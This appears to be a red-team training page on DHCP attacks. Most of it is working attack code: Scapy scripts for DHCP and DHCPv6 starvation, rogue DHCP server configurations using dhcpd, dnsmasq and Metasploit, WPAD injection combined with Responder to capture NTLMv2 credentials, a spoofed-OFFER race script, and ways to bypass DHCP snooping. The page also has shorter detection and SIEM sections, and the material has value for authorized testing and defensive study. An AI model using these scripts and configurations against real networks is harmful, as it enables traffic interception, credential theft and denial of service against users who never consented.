---
layout: training-page
title: "DHCP Attacks — Red Team Academy"
module: "Network Attacks"
tags:
  - dhcp
  - network
  - rogue-server
  - starvation
  - mitm
page_key: "network-dhcp-attacks"
render_with_liquid: false
---

# DHCP Attacks

DHCP has no authentication — any device on a segment can respond to DHCP requests. Two primary attacks: starvation exhausts the IP pool to force clients onto a rogue server, and rogue DHCP directly hands out attacker-controlled configuration including a malicious default gateway, DNS server, and WPAD proxy.

## Attack 1: DHCP Starvation

```bash
# Flood the DHCP server with requests using random source MACs
# Exhausts the IP pool — legitimate clients can't get addresses
# Used as a precursor to rogue DHCP (force clients to use yours)

# Yersinia
yersinia -I  # interactive
# Select DHCP → "sending DISCOVER packet" attack (type 1)

# CLI mode
yersinia dhcp -attack 1 -interface eth0

# DHCPig — starvation tool
# github.com/kamorin/DHCPig
python3 dhcpig.py eth0

# Scapy manual starvation
python3 << 'EOF'
from scapy.all import *
import random

def random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0,255)) for _ in range(6)])

def dhcp_discover(mac):
    return (Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') /
            IP(src='0.0.0.0', dst='255.255.255.255') /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=bytes.fromhex(mac.replace(':',''))) /
            DHCP(options=[('message-type','discover'), 'end']))

for _ in range(500):
    sendp(dhcp_discover(random_mac()), iface='eth0', verbose=0)
    
EOF
```

## Attack 2: Rogue DHCP Server

```bash
# After starvation (or if running in parallel), serve DHCP from attacker
# Clients get attacker's gateway/DNS → full MITM without ARP spoofing

# Option 1: dhcpd (ISC DHCP server)
# /etc/dhcp/dhcpd.conf:
cat > /tmp/rogue-dhcpd.conf << 'EOF'
subnet 192.168.1.0 netmask 255.255.255.0 {
  range 192.168.1.200 192.168.1.250;
  option routers 192.168.1.99;          # attacker IP as gateway
  option domain-name-servers 192.168.1.99;  # attacker IP as DNS
  option domain-name "corp.local";
  # WPAD — forces browser proxy auth (pairs with Responder)
  option wpad-url "http://wpad.corp.local/wpad.dat";
  # option 252 = WPAD proxy auto-discovery URL
  option 252 "http://192.168.1.99/wpad.dat\n";
  default-lease-time 300;
  max-lease-time 600;
}
EOF

dhcpd -cf /tmp/rogue-dhcpd.conf -pf /tmp/dhcpd.pid eth0

# Enable IP forwarding so traffic still reaches real gateway
echo 1 > /proc/sys/net/ipv4/ip_forward

# iptables NAT — forward intercepted traffic to real gateway
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE


# Option 2: dnsmasq (simpler setup)
dnsmasq --no-daemon \
  --interface=eth0 \
  --dhcp-range=192.168.1.200,192.168.1.250,300s \
  --dhcp-option=3,192.168.1.99 \
  --dhcp-option=6,192.168.1.99 \
  --dhcp-option=252,"http://192.168.1.99/wpad.dat" \
  --address=/#/192.168.1.99  # resolve all DNS to attacker


# Option 3: Metasploit rogue DHCP module
use auxiliary/server/dhcp
set SRVHOST 0.0.0.0
set NETMASK 255.255.255.0
set ROUTER 192.168.1.99
set DNSSERVER 192.168.1.99
set DOMAIN corp.local
run
```

## Attack 3: DHCP Option 252 — WPAD Injection

```bash
# Even without starvation, respond faster than the real DHCP server
# for targeted hosts using unicast DHCP responses

# DHCP option 252 tells Windows where to find the WPAD proxy config
# Windows automatically fetches wpad.dat and uses the proxy
# This forces NTLM auth → pairs perfectly with Responder

# Verify WPAD is being fetched after rogue DHCP
tcpdump -i eth0 'tcp port 80 and host 192.168.1.99'
# Should see GET /wpad.dat requests

# Serve wpad.dat to force NTLM authentication
cat > /var/www/html/wpad.dat << 'EOF'
function FindProxyForURL(url, host) {
    return "PROXY 192.168.1.99:8080";
}
EOF
```

## Rogue DHCP + Responder Combo

```bash
# Maximum effectiveness: rogue DHCP + Responder working together

# Terminal 1: Rogue DHCP (hands out attacker as DNS + WPAD)
dnsmasq --no-daemon --interface=eth0 \
  --dhcp-range=192.168.1.200,192.168.1.250,300s \
  --dhcp-option=3,192.168.1.99 \
  --dhcp-option=6,192.168.1.99 \
  --dhcp-option=252,"http://wpad/wpad.dat"

# Terminal 2: Responder answers WPAD DNS + serves fake auth
responder -I eth0 -w -F

# Clients that renew DHCP get:
# - Attacker as gateway → traffic sniffable
# - Attacker as DNS → all names resolve to attacker
# - WPAD URL → browsers auth to attacker → NTLMv2 captured
```

## Detection

```
Rogue DHCP indicators:
  - Unexpected DHCP server IP in offer packets
  - Short lease times from unknown server
  - Default gateway in different subnet from expected
  - Multiple DHCP servers responding (race condition visible in Wireshark)
  
Defensive controls:
  - DHCP snooping on managed switches (trusted ports only)
  - Dynamic ARP Inspection (DAI)
  - IP Source Guard
```

## DHCP Starvation with dhcpstarv and Yersinia

```bash
# DHCP starvation floods the server with DISCOVER packets using random source MACs
# Exhausts the lease pool → legitimate clients fail to get addresses
# Forces clients to look elsewhere → rogue DHCP takes over

# Method 1: dhcpstarv
# github.com/shirkdog/dhcpstarv (or apt install dhcpstarv on some distros)
dhcpstarv -i eth0
# Sends DISCOVER packets with random MACs until pool is exhausted
# Monitor: watch -n2 "cat /var/log/syslog | grep dhcp"

# Method 2: Yersinia — more control over rate and source MACs
yersinia -I
# Select: DHCP → "sending DISCOVER packet" → start attack
# Or CLI:
yersinia dhcp -attack 1 -interface eth0
# Attack 1 = flood DISCOVER (starvation)

# Method 3: dhcpig — aggressive starvation with ARP probing
# github.com/kamorin/DHCPig
python3 dhcpig.py eth0
# Also sends DECLINE for any leases that respond (maximizes starvation)

# Method 4: Scapy starvation script (customizable)
python3 << 'EOF'
from scapy.all import *
import random, time

def random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def make_discover(mac):
    mac_bytes = bytes.fromhex(mac.replace(':', ''))
    return (
        Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') /
        IP(src='0.0.0.0', dst='255.255.255.255') /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac_bytes, xid=random.randint(0, 0xFFFFFFFF)) /
        DHCP(options=[('message-type', 'discover'), 'end'])
    )

print("[*] Starting DHCP starvation...")
count = 0
while True:
    mac = random_mac()
    sendp(make_discover(mac), iface='eth0', verbose=0)
    count += 1
    if count % 100 == 0:
        print(f"[*] Sent {count} DISCOVER packets")
    time.sleep(0.01)
EOF

# Verify starvation worked (from another host on segment)
# dhclient eth0 should fail or receive nothing
```

## Rogue DHCP Server with dnsmasq

```bash
# dnsmasq is the simplest rogue DHCP setup — no config file needed

# Basic rogue DHCP — attacker as gateway and DNS
dnsmasq \
  --no-daemon \
  --interface=eth0 \
  --dhcp-range=192.168.1.200,192.168.1.250,255.255.255.0,300s \
  --dhcp-option=option:router,192.168.1.99 \
  --dhcp-option=option:dns-server,192.168.1.99 \
  --dhcp-option=option:domain-name,corp.local \
  --log-dhcp

# With WPAD injection (DHCP option 252)
dnsmasq \
  --no-daemon \
  --interface=eth0 \
  --dhcp-range=192.168.1.200,192.168.1.250,300s \
  --dhcp-option=3,192.168.1.99 \
  --dhcp-option=6,192.168.1.99 \
  --dhcp-option=252,"http://192.168.1.99/wpad.dat" \
  --address=/#/192.168.1.99 \
  --log-dhcp \
  --log-queries

# dnsmasq config file for persistent rogue DHCP setup
cat > /tmp/rogue-dnsmasq.conf << 'EOF'
interface=eth0
dhcp-range=192.168.1.200,192.168.1.250,255.255.255.0,5m
dhcp-option=option:router,192.168.1.99
dhcp-option=option:dns-server,192.168.1.99
dhcp-option=option:domain-name,corp.local
dhcp-option=252,http://192.168.1.99/wpad.dat
address=/#/192.168.1.99
log-dhcp
log-queries
log-facility=/tmp/dnsmasq.log
EOF

dnsmasq -C /tmp/rogue-dnsmasq.conf

# Enable IP forwarding so rogue gateway clients can still reach internet/intranet
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Watch who is getting leases from rogue server
tail -f /tmp/dnsmasq.log | grep DHCPACK
```

## Combining Rogue DHCP with WPAD for Proxy Injection

```bash
# Full chain: rogue DHCP → WPAD option → browser proxies through attacker
# → Responder captures NTLMv2 from every browser that connects

# Step 1: Start rogue DHCP (after starvation or race condition)
dnsmasq --no-daemon --interface=eth0 \
  --dhcp-range=192.168.1.200,192.168.1.250,300s \
  --dhcp-option=3,192.168.1.99 \
  --dhcp-option=6,192.168.1.99 \
  --dhcp-option=252,"http://wpad/wpad.dat" &

# Step 2: Start Responder to serve WPAD auth and capture NTLMv2
responder -I eth0 -w -F
# -w = serve WPAD (Responder listens on port 80 for /wpad.dat requests)
# -F = force downgrade Kerberos → NTLM on WPAD auth

# Step 3: Monitor for incoming connections
tail -f /usr/share/responder/logs/Responder-Session.log

# When client renews DHCP:
# 1. Gets 192.168.1.99 as DNS server
# 2. Browser queries: http://wpad/wpad.dat
# 3. DNS (dnsmasq): wpad → 192.168.1.99
# 4. Responder serves wpad.dat requiring NTLM auth
# 5. Browser authenticates → NTLMv2 captured

# Serve actual wpad.dat to avoid breaking client connectivity
cat > /var/www/html/wpad.dat << 'EOF'
function FindProxyForURL(url, host) {
    if (isInNet(host, "192.168.1.0", "255.255.255.0")) {
        return "DIRECT";
    }
    return "PROXY 192.168.1.99:8080";
}
EOF
```

## DHCP Snooping Bypass

```bash
# DHCP snooping on managed switches blocks rogue DHCP servers
# Only "trusted" ports (uplinks) can send DHCP OFFER/ACK
# Access ports are "untrusted" — DHCP server replies from access port = dropped

# Detection: is DHCP snooping enabled?
# If your rogue dnsmasq sends OFFER and no clients respond → snooping likely active
# Verify by checking if your own DHCP DISCOVER gets an OFFER from legitimate server

# Bypass approach 1: Find a trusted port (uplink/trunk)
# If you've done DTP trunk negotiation → your port is now trusted (trunk = trusted in snooping)
# Run rogue DHCP after establishing trunk via DTP

# Bypass approach 2: Physical access to server room / patch panel
# Connect to uplink port or inter-switch link
# These are typically trusted in DHCP snooping config

# Bypass approach 3: DHCP starvation is not blocked by snooping
# Snooping only blocks OFFER/ACK from untrusted ports
# DISCOVER flood from untrusted ports = still allowed (client traffic)
# Starve the pool → clients can't get addresses → but can't serve rogue DHCP...
# Use with DNS spoofing if you have another MITM path (ARP)

# Bypass approach 4: Race condition (respond faster than legitimate server)
# Craft a highly specific DHCP OFFER matching the victim's MAC
# Send it with a short delay after legitimate server OFFER
# Some clients accept first valid OFFER received
python3 << 'EOF'
from scapy.all import *
# Sniff for DHCP DISCOVER from specific victim
def handle_discover(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # message-type discover
        victim_mac = pkt[Ether].src
        # Immediately send an OFFER with attacker as gateway
        offer = (
            Ether(src="attacker_mac", dst=victim_mac) /
            IP(src="192.168.1.99", dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr="192.168.1.201", siaddr="192.168.1.99",
                  chaddr=bytes.fromhex(victim_mac.replace(':', ''))) /
            DHCP(options=[('message-type', 'offer'),
                          ('server_id', '192.168.1.99'),
                          ('router', '192.168.1.99'),
                          ('name_server', '192.168.1.99'),
                          ('subnet_mask', '255.255.255.0'),
                          ('lease_time', 300), 'end'])
        )
        sendp(offer, iface="eth0", verbose=1)

sniff(iface="eth0", filter="udp port 67", prn=handle_discover)
EOF
```

## IPv6 DHCPv6 Attacks

```bash
# DHCPv6 operates on UDP port 546 (client) and 547 (server)
# No equivalent of DHCP snooping is deployed by default on most switches
# Windows hosts solicit DHCPv6 periodically even when IPv6 is "disabled"

# Relation to mitm6 (see network-attacks/mitm6):
# mitm6 IS the DHCPv6 rogue server
# This section covers standalone DHCPv6 starvation and rogue server

# DHCPv6 starvation with Scapy
python3 << 'EOF'
from scapy.all import *
import random, string

def random_duid():
    return bytes([random.randint(0, 255) for _ in range(14)])

for _ in range(200):
    # DHCPv6 SOLICIT with random DUID
    pkt = (
        Ether(dst="33:33:00:01:00:02") /
        IPv6(dst="ff02::1:2") /
        UDP(sport=546, dport=547) /
        DHCP6_Solicit() /
        DHCP6OptClientId(duid=DUID_LLT(lladdr=RandMAC()))
    )
    sendp(pkt, iface="eth0", verbose=0)
EOF

# Rogue DHCPv6 server (standalone, without mitm6)
# python3 -m pydhcp6 or use rogue-dhcp6 scripts
# The key: hand out attacker IPv6 address as DNS server
# All IPv6 DNS from Windows goes to attacker → redirect to NTLM auth

# mitm6 handles both DHCPv6 advertisement AND DNS spoofing in one tool:
mitm6 -i eth0 -d contoso.local
# See: /network-attacks/mitm6/ for full relay chain
```

## Detection: DHCP Anomalies in SIEM

```
DHCP lease anomaly detection:
  - Multiple DHCP leases from single MAC in short window
    (legitimate device renews 1x per lease time; starvation = thousands)
    Alert: >50 DHCP DISCOVER from same MAC in 60 seconds

  - New DHCP server responding (unexpected OFFER source IP/MAC)
    Alert: DHCP OFFER from IP not in approved DHCP server list
    Tools: DHCP snooping logs, Wireshark, Zeek DHCP log

  - Lease time shorter than policy minimum
    Rogue DHCP often sets 300s; legitimate = 4-8 hours
    Alert: DHCP OFFER with lease_time < 600

  - Gateway option pointing to unknown IP
    Alert: DHCP OFFER router option = IP not in approved gateway list

  - WPAD option in DHCP response from unexpected server
    Alert: Option 252 present in DHCP OFFER from non-approved server

Zeek (Bro) DHCP logging:
  - DHCP activity logged to dhcp.log: ts, uid, id, mac, assigned_ip, lease_time, msg_types
  - Alert on: multiple msg_types=DISCOVER from same mac in short window
  - Alert on: msg_types=OFFER from unexpected server IP

Windows Event logs:
  - Event ID 1001 (DHCP client obtained address from rogue server)
  - DNS client log: Event 1014 (name resolution timeout — post-starvation)
```

## Resources

- Yersinia — `github.com/tomac/yersinia`
- DHCPig — `github.com/kamorin/DHCPig`
- mitm6 (DHCPv6 attacks) — `github.com/dirkjanm/mitm6`
- MITRE T1557 — Adversary-in-the-Middle — `attack.mitre.org/techniques/T1557/`
- Responder WPAD — `/network-attacks/responder/`
- dnsmasq documentation — `thekelleys.org.uk/dnsmasq/doc.html`
